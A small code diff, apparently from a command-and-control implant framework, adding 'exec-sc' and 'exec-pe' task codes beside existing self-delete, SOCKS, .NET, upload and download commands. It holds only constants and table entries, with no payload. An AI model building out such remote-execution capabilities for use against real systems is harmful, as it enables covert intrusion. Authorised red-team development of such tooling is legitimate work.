@@ -27,6 +27,8 @@ T_SELFDEL   = 17;
 T_EXIT      = 18;
 T_DOTNET    = 19;
 T_SOCKS     = 20;
+T_EXEC_SC   = 21;
+T_EXEC_PE   = 22;
 
 SB_DT_INLINE = 5;
 SB_DT_UNLOAD = 6;
@@ -74,6 +76,8 @@ Commands = {
     "upload":    {"hex_code": T_UPLOAD},
     "download":  {"hex_code": T_DOWNLOAD},
     "info"    :  {"hex_code": T_INFO},
+    "exec-sc" :  {"hex_code": T_EXEC_SC},
+    "exec-pe" :  {"hex_code": T_EXEC_PE},
 
     "dotnet": {
         "hex_code": T_DOTNET,
